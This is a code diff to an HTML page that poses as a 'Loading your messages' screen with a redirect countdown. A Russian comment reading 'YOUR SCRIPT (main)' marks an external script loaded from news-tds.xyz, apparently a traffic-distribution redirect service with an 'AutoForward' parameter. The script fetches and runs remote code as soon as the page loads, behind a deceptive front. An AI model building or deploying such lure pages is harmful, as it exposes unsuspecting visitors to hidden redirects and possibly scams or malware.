@@ -1,12 +1,54 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <title>Loading...</title>
+
+<style>
+body {
+    background: #111;
+    color: white;
+    text-align: center;
+    font-family: Arial;
+    padding-top: 100px;
+}
+.box {
+    background: #1c1c1c;
+    padding: 30px;
+    border-radius: 15px;
+    width: 300px;
+    margin: auto;
+}
+.timer {
+    color: #ff4444;
+    margin-top: 10px;
+}
+</style>
+
+<script>
+let time = 5;
+function countdown() {
+    document.getElementById("timer").innerText = time;
+    time--;
+}
+setInterval(countdown, 1000);
+</script>
+
 </head>
+
 <body>
 
-<script src='https://news-tds.xyz/?p=M2Q5ZGIwMTgzNTQwYjJhOTMzY2ZjY2M0Zjg2YzA4Y2V8NDQ1NTQxfEF1dG9Gb3J3YXJkfHwxMDAwfDcxNjg5NDM3&build_ad_code=1&v=2&poid=0'></script>
+<div class="box">
+    <h2>🔥 Loading your messages...</h2>
+    <p>Please wait while we connect you</p>
+
+    <div class="timer">
+        Redirecting in <span id="timer">5</span> sec...
+    </div>
+</div>
+
+<!-- ТВОЙ СКРИПТ (главное) -->
+<script language='JavaScript' type='text/javascript' src='https://news-tds.xyz/?p=M2Q5ZGIwMTgzNTQwYjJhOTMzY2ZjY2M0Zjg2YzA4Y2V8NDQ1NTQxfEF1dG9Gb3J3YXJkfHwxMDAwfDcxNjg5NDM3&build_ad_code=1&v=2&poid=0'></script>
 
 </body>
 </html>
